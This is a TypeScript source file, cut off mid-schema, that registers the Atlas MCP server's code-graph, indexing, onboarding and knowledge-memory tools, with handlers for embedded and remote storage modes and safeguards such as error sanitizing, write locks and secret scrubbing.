/**
 * mcp/allTools.ts — registers every Atlas tool into the ToolRegistry.
 *
 * This is the single file to edit when adding or removing tools. The
 * shim in server.ts reads from this registry; it never needs to know
 * about individual tools.
 *
 * JSON Schema objects here mirror the Zod schemas previously defined
 * inline in server.ts. Both are kept in sync manually — the JSON Schema
 * is what atlas_tool_schema returns to callers; Zod validation lives
 * inside the individual tool runners.
 */

import { ToolRegistry, safeErrorDetail } from './toolRegistry.js';
import { exportMemory, importMemory, collectKnowledgeView } from '../cli/memorySync.js';
import { flagUnbackedWork } from '../pmDecision.js';
import { resolveLoreContext, tokenMissingError } from './context.js';
import { scrubKnowledgeFields } from '../security/secretScrub.js';
import { resolveCodeReader } from './loreReaderFactory.js';
import { withEmbeddedLore, borrowEmbeddedLore, closeEmbeddedLore, embeddedBaseDir, embeddedDataDir } from './embeddedRegistry.js';
import { writeStatsSnapshot, buildWorkspaceStatsEntry } from './statsSnapshot.js';
import { acquireWorkspaceWriteLock, WorkspaceLockedError } from '../lore/writerLock.js';
import { beginIndexWork, endIndexWork, isShuttingDown } from '../lore/indexDrain.js';
import * as fs from 'node:fs';
import * as path from 'node:path';
import { LoreClient } from '../loreClient.js';
import { runHealth } from './tools/health.js';
import { runCallGraph } from './tools/callGraph.js';
import { runFindDeadCode } from './tools/findDeadCode.js';
import { runBlastRadius } from './tools/blastRadius.js';
import { runSchemaDriftTool } from './tools/schemaDrift.js';
import { runLayerViolations } from './tools/layerViolations.js';
import { runHotspots } from './tools/hotspots.js';
import { runIndexTool } from './tools/index.js';
import { runKnowledgeList } from './tools/knowledgeList.js';
import { runIndexStatusTool } from './tools/indexStatus.js';
import { runSourceTool } from './tools/source.js';
import { listCommunities } from '../communities/index.js';
import { traceProcess } from '../processes/index.js';
import { buildSubgraph } from '../graph/subgraph.js';
import { buildFullGraph } from '../graph/fullGraph.js';
import {
    storeKnowledgeNode,
    storeKnowledgeEdge,
    recallKnowledge,
    searchKnowledge,
    supersedeNode,
} from './knowledgeProxy.js';
import { runVerbatimStore, runVerbatimRecall, runVerbatimImport } from './tools/verbatim.js';
import {
    createWorkspace,
    listWorkspaces,
    addWorkspaceProject,
    getWorkspaceStatus,
} from './workspaceProxy.js';
import { runLLMChat } from './tools/llmChat.js';
import { loadConfig, writeLLMConfig, writeCloudSyncConfig, type LLMConfig, type CloudSyncConfig } from '../config.js';
import { cloudUrlError, loopbackUrlError } from '../httpTransport.js';
import { scanPathError } from '../indexRoots.js';
import { installWire } from '../cli/wire.js';
import { indexInFlight as _indexInFlight } from './indexInFlight.js';
import { runOnboard } from './tools/onboard.js';
import { invalidateWorkspaceResolverCache } from '../pathWorkspaceResolver.js';

/**
 * RD-Mrawerr — log the real error server-side and return a SANITIZED detail to
 * the MCP client. Raw `err.message` can carry absolute paths, internal Lore
 * responses, or stack fragments — none of which should cross the tool boundary.
 */
function sanitizedToolError(label: string, err: unknown): { error: string; detail: string } {
    console.error(`[atlas] ${label}: ${(err as Error)?.message ?? String(err)}`);
    // Surface the path-redacted, actionable message (not a blanket "internal
    // error") — same posture as ToolRegistry.invoke's catch.
    return { error: label, detail: safeErrorDetail(err) };
}

// ── Durable knowledge backup ─────────────────────────────────────────────────
//
// The knowledge moat (decisions/conventions/…) is the precious, hard-to-recreate
// part of a workspace — but it lived ONLY inside lore-data/<ws>/, so a
// destructive index rebuild (or an accidental `rm -rf`) permanently lost it (it
// bit us: a v3 code-index rebuild wiped the team's planning knowledge). We now
// mirror it to <ATLAS_HOME>/knowledge-backups/<ws>.jsonl — OUTSIDE the wipeable
// data dir — after every knowledge write. Recover with
// `atlas memory import <ATLAS_HOME>/knowledge-backups/<ws>.jsonl`.
//
// Trailing-debounced (one export 1.5s after the last write in a burst), fire-and-
// forget, error-swallowed, unref'd — a backup hiccup can NEVER fail or slow a
// write, and it never keeps the process alive.
const _knowledgeBackupTimers = new Map<string, ReturnType<typeof setTimeout>>();

// RD-index-reentrancy — workspaces with an atlas_index run in flight. A second
// concurrent index of the SAME workspace would contend with the first on the
// one shared kuzu handle (EmbeddedLore.withRetry exists precisely because
// background writers already contend with an index batch — a second full index
// blows that retry budget → partial-index / write failures) and corrupt the
// single per-workspace index_status progress record. Reject the overlap
// instead; the caller polls index_status and retries when it's clear.
// Shared with atlas_onboard's background launcher via mcp/indexInFlight.ts.
function mirrorKnowledgeBackup(lore: unknown, workspace: string, home: string): void {
    const prev = _knowledgeBackupTimers.get(workspace);
    if (prev) clearTimeout(prev);
    const t = setTimeout(() => {
        _knowledgeBackupTimers.delete(workspace);
        const safe = workspace.replace(/[^A-Za-z0-9._-]+/g, '_') || 'default';
        const out = path.join(home, 'knowledge-backups', `${safe}.jsonl`);
        void exportMemory(lore as never, workspace, out).catch(() => undefined);
    }, 1500);
    if (typeof t.unref === 'function') t.unref();
    _knowledgeBackupTimers.set(workspace, t);
}

export function buildRegistry(bootTimeMs: number): ToolRegistry {
    const registry = new ToolRegistry();

    registry.register({
        name: 'atlas_health',
        description: 'Liveness check for the Atlas daemon. Returns status, version, uptime_ms.',
        inputSchema: { type: 'object', properties: {} },
        handler: async () => runHealth(bootTimeMs),
    });

    registry.register({
        name: 'atlas_call_graph',
        description: 'Call graph for a symbol — direct callers (upstream) or callees (downstream), d1/d2/d3 reachability.',
        inputSchema: {
            type: 'object',
            required: ['symbol'],
            properties: {
                symbol: { type: 'string', description: 'Symbol name, qualified name, or id.' },
                direction: { type: 'string', enum: ['upstream', 'downstream'], description: 'Default downstream.' },
                // The ambiguity error tells callers to "pass a repo qualifier" —
                // it must be IN the schema or an agent following that instruction
                // finds no such field and gets stuck in a retry loop.
                repo: { type: 'string', description: 'Repo qualifier to disambiguate a symbol that exists in several indexed repos (the ambiguity error names the candidates).' },
                workspace: { type: 'string', description: 'Lore workspace; defaults to Atlas config.' },
            },
        },
        handler: async (args) => {
            const __r = resolveCodeReader();
            if ('error' in __r) return __r.error;
            const reader = __r.reader;
            return runCallGraph(reader, args as never, __r.workspace);
        },
    });

    registry.register({
        name: 'atlas_find_dead_code',
        description: 'Symbols with zero inbound references — callable kinds only, entry-point names exempted.',
        inputSchema: {
            type: 'object',
            properties: {
                file: { type: 'string', description: 'Filter to one file.' },
                limit: { type: 'integer', description: 'Cap on candidate count (default 100).' },
                workspace: { type: 'string' },
            },
        },
        handler: async (args) => {
            const __r = resolveCodeReader();
            if ('error' in __r) return __r.error;
            const reader = __r.reader;
            return runFindDeadCode(reader, args as never, __r.workspace);
        },
    });

    registry.register({
        name: 'atlas_blast_radius',
        description: 'Depth-tiered reachability for a symbol (d1=WILL BREAK, d2=LIKELY, d3=MAY NEED TESTING).',
        inputSchema: {
            type: 'object',
            required: ['symbol'],
            properties: {
                symbol: { type: 'string', description: 'Symbol name, qualified name, or id.' },
                direction: { type: 'string', enum: ['upstream', 'downstream'] },
                edgeKinds: { type: 'array', items: { type: 'string' }, description: 'Default [calls, imports].' },
                workspace: { type: 'string' },
            },
        },
        handler: async (args) => {
            const __r = resolveCodeReader();
            if ('error' in __r) return __r.error;
            const reader = __r.reader;
            return runBlastRadius(reader, args as never, __r.workspace);
        },
    });

    registry.register({
        name: 'atlas_schema_drift',
        description: 'Compare a live-DB schema dump (pg_dump/mysqldump/prisma) against declared schema files (.sql/.prisma/.graphql). File-based; no DB connection needed.',
        inputSchema: {
            type: 'object',
            required: ['schemaFile'],
            properties: {
                schemaFile: { type: 'string', description: 'Path to the live dump file.' },
                declaredFiles: { type: 'array', items: { type: 'string' }, description: 'Explicit list of declared files; defaults to discovery.' },
                repoRoot: { type: 'string', description: 'Repo root for relative paths (defaults to cwd).' },
                workspace: { type: 'string' },
            },
        },
        handler: async (args) => {
            const __r = resolveCodeReader();
            if ('error' in __r) return __r.error;
            const reader = __r.reader;
            return runSchemaDriftTool(reader, args as never);
        },
    });

    registry.register({
        name: 'atlas_layer_violations',
        description: 'Edges that violate user-declared LayerSpec rules (e.g., ui→core OK, ui⇏plugins).',
        inputSchema: {
            type: 'object',
            properties: {
                layerSpec: { description: 'Override of the default LayerSpec.' },
                workspace: { type: 'string' },
            },
        },
        handler: async (args) => {
            const __r = resolveCodeReader();
            if ('error' in __r) return __r.error;
            const reader = __r.reader;
            return runLayerViolations(reader, args as never, __r.workspace);
        },
    });

    registry.register({
        name: 'atlas_hotspots',
        description: 'High-complexity (+ optionally high-churn) symbols ranked by risk. Falls back to complexity-only without repoRoot.',
        inputSchema: {
            type: 'object',
            properties: {
                limit: { type: 'integer' },
                minComplexity: { type: 'integer' },
                churnSinceDays: { type: 'integer' },
                repoRoot: { type: 'string', description: 'Repo root for git churn lookup.' },
                workspace: { type: 'string' },
            },
        },
        handler: async (args) => {
            const __r = resolveCodeReader();
            if ('error' in __r) return __r.error;
            const reader = __r.reader;
            return runHotspots(reader, args as never, __r.workspace);
        },
    });

    registry.register({
        name: 'atlas_communities',
        description: 'List communities (codebase neighborhoods) detected in the workspace. Clusters code_file nodes by their call/import relationships and labels each cluster by its dominant directory or symbol root, so an agent asking "where does X live?" gets a labeled module instead of a flat function list. Embedded Lore mode only.',
        inputSchema: {
            type: 'object',
            properties: {
                workspace: { type: 'string', description: 'Lore workspace. Defaults to Atlas config workspace.' },
                minSize: { type: 'integer', description: 'Drop communities smaller than this. Default 2.' },
                sampleSize: { type: 'integer', description: 'Number of sample files/symbols per community. Default 5.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            // Embedded-only: listCommunities needs the unbounded
            // listNodes + listEdges read surface that only EmbeddedLore
            // exposes (mirrors the memory export contract).
            if (cfg.lore.mode !== 'embedded') {
                return { error: 'atlas_communities requires lore.mode=embedded', detail: `current mode: ${cfg.lore.mode}` };
            }
            const workspace = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            try {
                return await withEmbeddedLore(cfg, workspace, async (lore) => {
                    return await listCommunities(lore, workspace, {
                        minSize: args.minSize as number | undefined,
                        sampleSize: args.sampleSize as number | undefined,
                    });
                });
            } catch (err) {
                return sanitizedToolError('atlas_communities failed', err);
            }
        },
    });

    registry.register({
        name: 'atlas_processes',
        description: 'Trace execution flow from an entry symbol downstream through call edges. Returns ordered steps with depth + terminal markers.',
        inputSchema: {
            type: 'object',
            required: ['entry'],
            properties: {
                entry: { type: 'string', description: 'Symbol name (e.g. "mount"), qualified suffix (e.g. "Foo.bar"), or full code-symbol id.' },
                workspace: { type: 'string', description: 'Lore workspace. Defaults to Atlas config workspace.' },
                maxDepth: { type: 'integer', description: 'Cap traversal depth. Default 8.' },
                maxSteps: { type: 'integer', description: 'Cap total steps returned. Default 200.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            // Embedded-only: traceProcess needs the unbounded listNodes
            // + listEdges read surface that only EmbeddedLore exposes
            // (mirrors atlas_communities).
            if (cfg.lore.mode !== 'embedded') {
                return { error: 'atlas_processes requires lore.mode=embedded', detail: `current mode: ${cfg.lore.mode}` };
            }
            const workspace = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            try {
                return await withEmbeddedLore(cfg, workspace, async (lore) => {
                    return await traceProcess(lore, workspace, args.entry as string, {
                        maxDepth: args.maxDepth as number | undefined,
                        maxSteps: args.maxSteps as number | undefined,
                    });
                });
            } catch (err) {
                return sanitizedToolError('atlas_processes failed', err);
            }
        },
    });

    registry.register({
        name: 'atlas_subgraph',
        description: 'Return a bounded N-hop slice of the code graph around a center node or community, for visualization.',
        inputSchema: {
            type: 'object',
            properties: {
                workspace: { type: 'string', description: 'Lore workspace. Defaults to Atlas config workspace.' },
                center: { type: 'string', description: 'Node id (code-file:… | code-symbol:…) to BFS from. Provide this OR community, not both.' },
                community: { type: 'string', description: 'Community id (from atlas_communities) to expand — all its files seed the BFS. Content-stable across re-index (e.g. "locale~format"). Provide this OR center, not both.' },
                depth: { type: 'integer', description: 'Traversal depth cap. Default 2.' },
                nodeTypes: { type: 'array', items: { type: 'string' }, description: 'Only include nodes of these types (e.g. ["code_file","code_symbol"]). Applied during BFS.' },
                maxNodes: { type: 'integer', description: 'Node cap. Default 200, hard-clamped to <= 1000.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            // Embedded-only: buildSubgraph needs the unbounded listNodes +
            // listEdges + getNode read surface that only EmbeddedLore exposes
            // (mirrors atlas_communities / atlas_processes).
            if (cfg.lore.mode !== 'embedded') {
                return { error: 'atlas_subgraph requires lore.mode=embedded', detail: `current mode: ${cfg.lore.mode}` };
            }
            const workspace = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            try {
                return await withEmbeddedLore(cfg, workspace, async (lore) => {
                    return await buildSubgraph(lore, workspace, {
                        center: args.center as string | undefined,
                        // GF-4: community id is now a content-stable string. Back-compat:
                        // tolerate a legacy bare number arriving over the wire by
                        // coercing to string (it won't resolve to a stable id, but it
                        // surfaces a clean "no members" error rather than a type crash).
                        community: args.community != null ? String(args.community) : undefined,
                        depth: args.depth as number | undefined,
                        nodeTypes: args.nodeTypes as string[] | undefined,
                        maxNodes: args.maxNodes as number | undefined,
                    });
                });
            } catch (err) {
                return sanitizedToolError('atlas_subgraph failed', err);
            }
        },
    });

    registry.register({
        name: 'atlas_fullgraph',
        description: 'Return the ENTIRE code graph for a workspace (all nodes + induced edges) for a whole-workspace visualization. Capped at maxNodes (default 3000, hard-clamped to <= 8000); folders/files/knowledge survive the cap before symbols. Use atlas_subgraph instead for a focused N-hop slice.',
        inputSchema: {
            type: 'object',
            properties: {
                workspace: { type: 'string', description: 'Lore workspace. Defaults to Atlas config workspace.' },
                nodeTypes: { type: 'array', items: { type: 'string' }, description: 'Only include nodes of these Lore types (e.g. ["code_file","code_folder"]). Default: all structural + knowledge types.' },
                maxNodes: { type: 'integer', description: 'Node cap. Default 3000, hard-clamped to <= 8000.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            if (cfg.lore.mode !== 'embedded') {
                return { error: 'atlas_fullgraph requires lore.mode=embedded', detail: `current mode: ${cfg.lore.mode}` };
            }
            const workspace = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            try {
                return await withEmbeddedLore(cfg, workspace, async (lore) => {
                    return await buildFullGraph(lore, workspace, {
                        nodeTypes: args.nodeTypes as string[] | undefined,
                        maxNodes: args.maxNodes as number | undefined,
                    });
                });
            } catch (err) {
                return sanitizedToolError('atlas_fullgraph failed', err);
            }
        },
    });

    registry.register({
        name: 'atlas_index',
        description: 'Re-index a file or directory: parse → resolve → write code_file and code_symbol nodes + call edges into Lore. Directories are INCREMENTAL by default (resume): files unchanged per the walk root\'s .atlas/index-state.json still feed cross-file resolution but are not re-written. Single-file runs resolve cross-file edges against the persisted workspace graph and reconcile that file\'s stale nodes (renamed/removed symbols). embed:false on all code nodes.',
        inputSchema: {
            type: 'object',
            required: ['path'],
            properties: {
                path: { type: 'string', description: 'Absolute or repo-relative path to file or directory.' },
                workspace: { type: 'string' },
                resume: { type: 'boolean', description: 'Directories only. Default true (incremental — skip unchanged files). false forces a full re-write plus stale-node reconcile.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            // RD-index-reentrancy — reject a concurrent index of the same
            // workspace (see _indexInFlight). Key on the resolved workspace.
            const guardKey = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            // RC #3 — refuse to START a new index once shutdown has begun; the
            // shutdown drain is waiting for in-flight work to finish, and a fresh
            // write could be torn down mid-flight.
            if (isShuttingDown()) {
                return { error: 'shutting_down', tool: 'atlas_index', detail: 'the daemon is shutting down — index rejected' };
            }
            if (_indexInFlight.has(guardKey)) {
                return { error: 'index_in_progress', tool: 'atlas_index', detail: `an index of workspace '${guardKey}' is already running — poll index_status and retry when it's idle` };
            }
            _indexInFlight.add(guardKey);
            try {
                // Embedded: write through the SHARED per-workspace instance (same
                // kuzu handle the read tools use — no double-open contention). The
                // registry owns its lifecycle, so we don't close it here.
                if (cfg.lore.mode === 'embedded') {
                    // RC #1 — the in-process _indexInFlight Set above only guards
                    // daemon-vs-daemon overlap; a SEPARATE `atlas index` CLI process
                    // can't see it. Take the cross-process filesystem writer lock on
                    // the same dataDir the CLI locks, so the two processes serialize.
                    const dataDir = embeddedDataDir(cfg, guardKey);
                    let releaseLock: (() => void) | null = null;
                    try {
                        releaseLock = acquireWorkspaceWriteLock(dataDir).release;
                    } catch (err) {
                        if (err instanceof WorkspaceLockedError) {
                            return { error: 'index_in_progress', tool: 'atlas_index', detail: `workspace '${guardKey}' is being indexed by pid ${err.holderPid} (a concurrent 'atlas index' CLI run) — retry when it's done` };
                        }
                        return sanitizedToolError('atlas_index failed', err);
                    }
                    // RC #3 — register this in-flight index so a shutdown signal
                    // drains it before closing store handles.
                    beginIndexWork(guardKey);
                    // RC #4 — borrow the shared instance so LRU eviction can't close
                    // its native handles mid-write. Released with the lock below.
                    let borrowed: Awaited<ReturnType<typeof borrowEmbeddedLore>> | null = null;
                    try {
                        borrowed = await borrowEmbeddedLore(cfg, guardKey);
                        const res = await runIndexTool(borrowed.lore, args as never, guardKey, cfg);
                        // STATS SNAPSHOT — the index just finished with the store
                        // open and warm, so persist <dataDir>/stats.json now. This is
                        // the ONE moment the whole-store counts are cheap to grab
                        // (getStats count() + one DISTINCT), and it lets the
                        // workspaces list read KPIs as a pure fs read that never opens
                        // a Kuzu store per workspace. Best-effort: a successful index
                        // must NOT fail over a snapshot-write hiccup.
                        try {
                            await writeStatsSnapshot(borrowed.lore, dataDir);
                        } catch (err) {
                            process.stderr.write(`[atlas] stats snapshot skipped: ${(err as Error).message}\n`);
                        }
                        return res;
                    } catch (err) {
                        return sanitizedToolError('atlas_index failed', err);
                    } finally {
                        borrowed?.release();
                        endIndexWork(guardKey);
                        releaseLock();
                    }
                }
                const lc = resolveLoreContext();
                if (!lc.token) return tokenMissingError();
                const client = new LoreClient({ mcpUrl: lc.mcpUrl, token: lc.token });
                try {
                    await client.connect();
                    return await runIndexTool(client, args as never, lc.workspace, cfg);
                } catch (err) {
                    return sanitizedToolError('atlas_index failed', err);
                } finally {
                    await client.close().catch(() => undefined);
                }
            } finally {
                _indexInFlight.delete(guardKey);
            }
        },
    });

    registry.register({
        name: 'index_status',
        description: 'Live progress of an in-flight atlas_index/atlas_onboard run for a workspace. Pollable + non-blocking — poll ~1s while a run is active. Returns {indexing, phase, filesDone, filesTotal, nodesWritten, edgesWritten, jobId?, skippedFiles?}. indexing===true means a run is in flight (independent of which client triggered it); phase is idle|parsing|writing|done|error. jobId correlates a fire-and-forget atlas_onboard run. skippedFiles reports files the parser deliberately skipped, with reasons ({count, byReason, sample}). Code nodes are embed:false so there is NO embedding bar; embedsPending appears only when the context layer is on, with no fabricated total.',
        inputSchema: {
            type: 'object',
            properties: {
                workspace: { type: 'string', description: 'Lore workspace. Defaults to Atlas config workspace.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            const workspace = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            // Pure read of the process-level progress registry the indexer writes
            // to — no Lore instance needed, never blocks, safe in any lore.mode.
            return runIndexStatusTool({ workspace }, workspace);
        },
    });

    registry.register({
        name: 'atlas_onboard',
        description: 'Onboard a project in ONE call — replaces the workspace_create → workspace_add_project → atlas_index → atlas_wire sequence. Derives the workspace from the repo folder slug (reusing an existing matching workspace), detects a stale/wrong-path .atlas/index-state.json and forces a full re-index when found, fires indexing as a BACKGROUND job (returns immediately with a jobId — poll index_status; a large repo can take tens of minutes and that is expected), then installs the wire harness (hooks, CLAUDE.md + AGENTS.md standing instructions, git memory-sync). Returns one summary: workspace, what was installed, jobId, and any stale-index warning. Pass wait:true to block for terminal counts instead.',
        inputSchema: {
            type: 'object',
            required: ['path'],
            properties: {
                path: { type: 'string', description: 'Absolute or repo-relative path to the project directory.' },
                workspace: { type: 'string', description: 'Workspace override (slug: lowercase letters, numbers, hyphens). Default: derived from the repo folder slug; an existing workspace of that name is reused.' },
                wait: { type: 'boolean', description: 'Default false = fire-and-forget (returns a jobId; poll index_status). true = block until the index finishes and include terminal files/symbols/edges + skipped-files counts in the summary.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            try {
                return await runOnboard(cfg, args as never);
            } catch (err) {
                return sanitizedToolError('atlas_onboard failed', err);
            }
        },
    });

    registry.register({
        name: 'atlas_source',
        description: 'Read a source-line slice for a file the code graph knows about — for the inspector\'s inline code view. Path is repo-relative (as in code_file.label / SubgraphNode.file). Resolves ONLY against registered repo roots and refuses any path that escapes a root (traversal / absolute / symlink). Returns the requested lines plus a small context margin and the file\'s total line count.',
        inputSchema: {
            type: 'object',
            required: ['path'],
            properties: {
                path: { type: 'string', description: 'Repo-relative file path (as in code_file.label / SubgraphNode.file).' },
                startLine: { type: 'integer', description: '1-based first line of the slice. Omit for the whole file.' },
                endLine: { type: 'integer', description: '1-based last line of the slice.' },
                contextMargin: { type: 'integer', description: 'Extra lines above/below the slice. Default 5.' },
                repo: { type: 'string', description: 'Repo name (from the registry) to resolve against directly, if known.' },
                workspace: { type: 'string' },
            },
        },
        // Pure filesystem + registry: no EmbeddedLore / daemon needed, so this
        // is NOT gated behind embedded mode. All path safety lives in
        // runSourceTool (anchored on the Atlas registry roots).
        handler: async (args) => {
            try {
                return await runSourceTool(args as never);
            } catch (err) {
                return sanitizedToolError('atlas_source failed', err);
            }
        },
    });

    // ── Sprint 2: Knowledge Proxy Tools ─────────────────────────────────────
    // All writes use embed:true — these nodes are recalled by semantic
    // similarity. Atlas proxies to Lore; IDEs never write to Lore directly.

    registry.register({
        name: 'knowledge_store',
        description: 'Store a semantic knowledge node (decision, convention, bug_pattern, troubleshooting, or architecture) into Lore with embedding enabled. Use this when an AI agent or developer captures institutional knowledge. Atlas proxies to Lore with embed:true.',
        inputSchema: {
            type: 'object',
            required: ['type', 'label', 'content', 'workspace'],
            properties: {
                id: { type: 'string', description: 'Optional stable ID. Auto-generated if omitted.' },
                type: {
                    type: 'string',
                    enum: ['decision', 'convention', 'bug_pattern', 'troubleshooting', 'architecture'],
                    description: 'Node type. decision=architectural choices, convention=naming/coding rules, bug_pattern=recurring bugs+fix, troubleshooting=recovery steps, architecture=high-level design.',
                },
                label: { type: 'string', description: 'Short human-readable title.' },
                content: { type: 'string', description: 'Full text content — the WHY, not just the WHAT. This is what gets embedded for semantic recall.' },
                tags: { type: 'string', description: 'Comma-separated tags for discoverability (e.g. "auth,security,jwt").' },
                workspace: { type: 'string', description: 'Lore workspace name.' },
                metadata: { type: 'string', description: 'Optional JSON string with extra structured fields.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            const workspace = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            // SECURITY — scrub secrets/PII out of the agent-authored free text
            // BEFORE it is persisted. Knowledge nodes are exported to
            // .atlas/memory.jsonl, which the wire harness commits and pushes, so
            // an unscrubbed store is a publishing surface: an agent that recalls a
            // credential and writes it into a decision node ships it to the remote.
            // Applies to both transports — the remote branch below is just as
            // capable of persisting the leak.
            const scrub = scrubKnowledgeFields({
                label: args.label as string | undefined,
                content: args.content as string | undefined,
                tags: args.tags as string | undefined,
                metadata: args.metadata as string | undefined,
            });
            // Embedded: write the knowledge node in-process WITH embed:true so
            // the vector lands in LanceDB and semantic recall works offline.
            if (cfg.lore.mode === 'embedded') {
                const id = (args.id as string | undefined)
                    ?? `knowledge:${args.type}:${Date.now()}-${Math.floor(Math.random() * 1e6)}`;
                return withEmbeddedLore(cfg, workspace, async (lore) => {
                    await lore.storeNode({
                        id,
                        type: args.type as string,
                        workspace,
                        embed: true,
                        label: scrub.node.label as string,
                        content: scrub.node.content as string,
                        tags: scrub.node.tags,
                        metadata: scrub.node.metadata,
                    } as never);
                    // Drain the background embed queue before returning so that a
                    // store→recall within the same turn sees the vector. The CLI
                    // sync paths (cli/memorySync.ts, cli/codeGraphSync.ts) do the
                    // same; the cost is negligible for one interactive node.
                    await lore.awaitEmbeds();
                    mirrorKnowledgeBackup(lore, workspace, cfg.home);
                    return { ok: true, id, embedded: true, ...(scrub.redacted ? { redacted: true } : {}) };
                });
            }
            const lc = resolveLoreContext();
            if (!lc.token) return tokenMissingError();
            return storeKnowledgeNode(lc.mcpUrl, lc.token, {
                ...(args as Record<string, unknown>),
                ...scrub.node,
                workspace,
            } as never);
        },
    });

    registry.register({
        name: 'knowledge_store_edge',
        description: 'Store an edge (relationship) between two knowledge nodes in Lore. Use to link a bug_pattern to a decision, or a convention to an architecture node.',
        inputSchema: {
            type: 'object',
            required: ['sourceId', 'targetId', 'relation', 'workspace'],
            properties: {
                sourceId: { type: 'string', description: 'ID of the source node.' },
                targetId: { type: 'string', description: 'ID of the target node.' },
                relation: { type: 'string', description: 'Edge relation label (e.g. "related_to", "caused_by", "resolves", "supersedes").' },
                workspace: { type: 'string' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            const workspace = (args.workspace as string | undefined) ?? cfg.lore.workspace;
            if (cfg.lore.mode === 'embedded') {
                return withEmbeddedLore(cfg, workspace, async (lore) => {
                    await lore.storeEdge({
                        sourceId: args.sourceId as string,
                        targetId: args.targetId as string,
                        relation: args.relation as string,
                        workspace,
                    });
                    mirrorKnowledgeBackup(lore, workspace, cfg.home);
                    return { ok: true, embedded: true };
                });
            }
            const lc = resolveLoreContext();
            if (!lc.token) return tokenMissingError();
            return storeKnowledgeEdge(lc.mcpUrl, lc.token, {
                ...(args as Record<string, unknown>),
                workspace,
            } as never);
        },
    });

    registry.register({
        name: 'knowledge_recall',
        description: 'Semantic recall — find knowledge nodes relevant to a topic using vector similarity search. Use before starting any task to retrieve existing decisions, conventions, and bug patterns. Proxies to Lore GET /api/recall. Single-project by default. For cross-project recall, co-load repos with `atlas group load` and recall against the combined store.',
        inputSchema: {
            type: 'object',
            required: ['topic'],
            properties: {
                topic: { type: 'string', description: 'Free-text topic to recall against (e.g. "auth token rotation", "database migration strategy").' },
                workspace: { type: 'string', description: 'Lore workspace. Defaults to Atlas config workspace.' },
                max: { type: 'integer', description: 'Max results to return. Default 10.' },
                mode: { type: 'string', enum: ['summary', 'full'], description: 'summary=titles+snippets only, full=complete node content. Default summary.' },
                includeSuperseded: { type: 'boolean', description: 'Include soft-deleted (superseded) nodes. Default false.' },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            // Embedded: in-process semantic recall (no daemon, no token).
            if (cfg.lore.mode === 'embedded') {
                return withEmbeddedLore(cfg, (args.workspace as string | undefined) ?? cfg.lore.workspace, async (lore) => {
                    return await lore.recall(args.topic as string, {
                        max: args.max as number | undefined,
                        includeSuperseded: args.includeSuperseded as boolean | undefined,
                        mode: args.mode as 'summary' | 'full' | undefined,
                    });
                });
            }
            const lc = resolveLoreContext();
            if (!lc.token) return tokenMissingError();
            return recallKnowledge(lc.mcpUrl, lc.token, {
                topic: args.topic as string,
                workspace: (args.workspace as string | undefined) ?? lc.workspace,
                max: args.max as number | undefined,
                mode: args.mode as 'summary' | 'full' | undefined,
                // GF-1 — `crossProject` dropped from the knowledge_recall surface:
                // it was inert in embedded mode (the primary path) and dishonestly
                // promised cross-project results. Cross-project co-query is delivered
                // by `atlas group load` (co-loads members into one store). The HTTP
                // proxy's RecallOpts.crossProject is left intact for non-Atlas clients.
                includeSuperseded: args.includeSuperseded as boolean | undefined,
            });
        },
    });

    registry.register({
        name: 'knowledge_search',
        description: 'Full-text search across knowledge nodes in Lore. Use when you know a specific term or ID rather than a semantic topic. Proxies to Lore GET /api/search.',
        inputSchema: {
            type: 'object',
            required: ['q'],
            properties: {
                q: { type: 'string', description: 'Search query string.' },
                workspace: { type: 'string' },
                limit: { type: 'integer', description: 'Max results. Default 20.' },
                type: {
                    type: 'string',
                    enum: ['decision', 'convention', 'bug_pattern', 'troubleshooting', 'architecture', 'code_symbol', 'code_file'],
                    description: 'Filter to a specific node type.',
                },
                search_mode: {
                    type: 'string',
                    enum: ['keyword', 'semantic', 'hybrid'],
                    description: 'Search mode (default: hybrid). keyword=Kùzu CONTAINS literal match; semantic=LanceDB vector similarity; hybrid=both fused.',
                },
            },
        },
        handler: async (args) => {
            const cfg = loadConfig();
            // Atlas tool default when no search_mode is sent by the MCP client:
            // 'hybrid' — matches Lore's own default and maximises recall. The
            // internal EmbeddedLore.search() keeps its own no-arg fast-path
            // (keyword) for older non-MCP callers; the explicit value here is
            // what the externally-visible knowledge_search contract promises.
            const searchMode = (args.search_mode as 'keyword' | 'semantic' | 'hybrid' | undefined) ?? 'hybrid';
            if (cfg.lore.mode === 'embedded') {
                const workspace = (args.workspace as string | undefined) ?? cfg.lore.workspace;
                return withEmbeddedLore(cfg, workspace, async (lore) => {
                    // Scope by project = the Atlas workspace (what writes are stamped with).
                    return await lore.search(args.q as string, (args.limit as number | undefined) ?? 20, args.type as string | undefined, workspace, searchMode);
                });
            }
            const lc = resolveLoreContext();
            if (!lc.token) return tokenMissingError();
            return searchKnowledge(lc.mcpUrl, lc.token, {
                q: args.q as string,
                workspace: (args.workspace as string | undefined) ?? lc.workspace,
                limit: args.limit as number | undefined,
                type: args.type as string | undefined,
                search_mode: searchMode,
            });
        },
    });

    registry.register({
        name: 'knowledge_list',
        description: 'COMPLETE, deterministic list of the knowledge nodes in a workspace — the "show me every standing rule for this project" call. Unlike knowledge_recall (semantic, ranked, relevance-capped) and knowledge_search (requires a non-empty query), this enumerates everything of the requested type with no ranking and no similarity cut-off. Ordered by id so offset/limit paging stays stable while other writes land; `total` counts all matches before paging. Superseded/retracted nodes are hidden unless includeSuperseded is set — when included they carry supersededBy, and a supersededBy of "knowledge:tombstone:<workspace>" means the node was RETRACTED (withdrawn as wrong) rather than replaced. Returns truncated:true if a pathological workspace exceeds the raw pull cap, in which case `total` is a LOWER BOUND — a partial list is never presented as complete.',
        inputSchema: {
            type: 'object',
            required: ['workspace'],
            properties: {
